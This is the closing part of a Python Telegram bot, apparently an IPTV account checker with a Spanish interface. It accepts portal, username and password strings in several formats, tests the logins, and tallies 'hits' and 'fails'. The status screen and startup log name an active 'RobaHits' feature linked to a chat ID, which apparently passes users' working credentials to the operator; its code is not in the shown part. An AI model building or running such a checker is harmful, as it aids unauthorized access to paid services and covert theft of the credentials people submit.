    status_text = "🟢 ACTIVO" if bot_active else "🔴 DETENIDO"
    
    await update.message.reply_text(
        f"""{LINE_TOP}
║                      📊 𝐄𝐒𝐓𝐀𝐃𝐎 𝐃𝐄𝐋 𝐁𝐎𝐓 📊                      ║
╠═══════════════════════════════════════════════════════════════════╣
║ 🐉 𝐁𝐨𝐭: {status_text}
║ ⏰ 𝐔𝐩𝐭𝐢𝐦𝐞: {hours:02d}h {minutes:02d}m {seconds:02d}s
║ 🕐 𝐇𝐨𝐫𝐚: {now_str()}
║ 🌐 𝐙𝐨𝐧𝐚: {TZ_NAME}
╠═══════════════════════════════════════════════════════════════════╣
║ ✅ 𝐇𝐢𝐭𝐬: {STATS['hits']}
║ ❌ 𝐅𝐚𝐢𝐥𝐬: {STATS['fails']}
║ 🔄 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: {STATS['retries']}
║ ⭐ 𝐓𝐨𝐭𝐚𝐥: {STATS['checks']}
║ 👥 𝐔𝐬𝐮𝐚𝐫𝐢𝐨𝐬: {len(STATS['users'])}
╠═══════════════════════════════════════════════════════════════════╣
║ 🔔 𝐑𝐨𝐛𝐚𝐇𝐢𝐭𝐬: ✅ Activo (solo activas)
║ 🤖 𝐓𝐡𝐫𝐞𝐚𝐝𝐬: {threading.active_count()}
╠═══════════════════════════════════════════════════════════════════╣
║ 🦂 {BOT_USERNAME}
{LINE_BOT}""",
        parse_mode=ParseMode.HTML
    )

async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "📌 **Uso:** `/check portal:puerto usuario contraseña`\n\n"
            "🔥 **Ejemplo:** `/check etvhosts.site:55337 usuario pass`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    await do_check(update, args[0], args[1], args[2])

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"""{LINE_TOP}
║                      📖 𝐀𝐘𝐔𝐃𝐀 — 𝐋𝐔𝐈𝐒 𝐑 📖                      ║
╠═══════════════════════════════════════════════════════════════════╣
║ 📌 <b>𝐂𝐨𝐦𝐚𝐧𝐝𝐨𝐬:</b>
║   /start — Iniciar bot
║   /check — Verificar cuenta manual
║   /help — Esta ayuda
║   /status — Estadísticas (admin)
║   /stop — Detener bot (admin)
╠═══════════════════════════════════════════════════════════════════╣
║ 💡 <b>𝐅𝐨𝐫𝐦𝐚𝐭𝐨𝐬 𝐬𝐨𝐩𝐨𝐫𝐭𝐚𝐝𝐨𝐬:</b>
║ • URL completa: <code>http://portal:8080/get.php?username=U&amp;password=P</code>
║ • XUI One: <code>http://portal/playlist/user/pass/m3u_plus</code>
║ • Pipe: <code>portal|usuario|pass</code>
║ • Espacio: <code>portal usuario pass</code>
╠═══════════════════════════════════════════════════════════════════╣
║ 🦂 {BOT_USERNAME}
{LINE_BOT}""",
        parse_mode=ParseMode.HTML
    )

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "help":
        await query.message.reply_text(
            "💡 **Pega tu URL directamente o usa /check**\n\n"
            "Formatos:\n"
            "• `http://portal/get.php?username=U&password=P`\n"
            "• `http://portal/playlist/user/pass/m3u_plus`\n"
            "• `portal|user|pass`",
            parse_mode=ParseMode.MARKDOWN
        )
    elif query.data == "stats":
        await query.message.reply_text(
            f"📊 **Estadísticas:**\n"
            f"✅ Hits: {STATS['hits']}\n"
            f"⭐ Checks: {STATS['checks']}\n"
            f"👥 Usuarios: {len(STATS['users'])}\n"
            f"🕐 {now_str()}",
            parse_mode=ParseMode.MARKDOWN
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active:
        await update.message.reply_text(f"🔴 Bot detenido.\n🦂 {BOT_USERNAME}")
        return
    
    text = update.message.text or ""
    portal, username, password, is_xui = extract_from_url(text)
    
    if portal and username and password:
        await do_check(update, portal, username, password, is_xui)
    else:
        await update.message.reply_text(
            "❓ **Formato no reconocido.**\n\n"
            "📌 **Ejemplos válidos:**\n"
            "`http://portal:8080/get.php?username=U&password=P`\n"
            "`http://portal/playlist/user/pass/m3u_plus`\n"
            "`portal|usuario|pass`\n\n"
            "Usa /help para más info.",
            parse_mode=ParseMode.MARKDOWN
        )

# ═══════════════════════════════════════════════════════════════════════════════
#  🚀 MAIN — 24/7 con reconexión automática
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    log.info(f"{LINE_TOP}")
    log.info(f"║     🐉 IPTV BOT ULTRA PRO v5.0 — BY LUIS R 🐉     ║")
    log.info(f"║              🌟 SISTEMA 24/7 ACTIVADO 🌟             ║")
    log.info(f"{LINE_BOT}")
    log.info(f"📅 Inicio: {now_str()}")
    log.info(f"🌐 Zona: {TZ_NAME}")
    log.info(f"🔔 RobaHits: {ROBAHITS_CHATID}")
    log.info(f"⚡ Timeouts: TCP={TCP_TIMEOUT}s | HTTP={CONN_TIMEOUT}s | READ={READ_TIMEOUT}s | TOTAL={TOTAL_TIMEOUT}s")
    
    RETRY_DELAYS = [5, 10, 15, 30, 60]
    attempt = 0
    
    while True:
        try:
            app = Application.builder().token(BOT_TOKEN).concurrent_updates(True).build()
            
            app.add_handler(CommandHandler("start", cmd_start))
            app.add_handler(CommandHandler("stop", cmd_stop))
            app.add_handler(CommandHandler("status", cmd_status))
            app.add_handler(CommandHandler("check", cmd_check))
            app.add_handler(CommandHandler("help", cmd_help))
            app.add_handler(CallbackQueryHandler(callback_handler))
            app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
            
            log.info("✅ Bot listo — Esperando mensajes...")
            app.run_polling(drop_pending_updates=True)
            
            attempt = 0
            time.sleep(2)
            
        except Exception as e:
            delay = RETRY_DELAYS[min(attempt, len(RETRY_DELAYS)-1)]
            log.error(f"❌ Error: {e}")
            log.info(f"🔄 Reconectando en {delay}s... (Intento {attempt + 1})")
            time.sleep(delay)
            attempt += 1

if __name__ == "__main__":
    main()
